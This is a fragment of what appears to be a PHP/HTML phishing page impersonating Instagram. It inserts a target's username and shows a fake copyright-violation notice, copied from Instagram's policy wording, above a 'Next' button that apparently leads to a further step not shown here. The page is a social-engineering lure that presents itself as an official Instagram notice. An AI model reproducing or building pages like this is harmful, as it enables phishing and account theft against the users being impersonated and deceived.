...
<link rel="icon" href="cwo/nins.png">	
<style>
...
<img src="cwo/nins.png" style="max-width:40%;">  <br>
<h1 id="set">@<?php echo $nick; ?> </h1>

<p id="yazi1">
In accordance with Instagram's Terms of Use and Community Guidelines, you may only post content on Instagram that does not violate someone else's intellectual property rights. The best way to make sure that the content you post on Instagram does not violate copyright laws is to only share content that you have created yourself.</p>
...
<br><br>
<button id="" class=next  type="submit">Next</button>
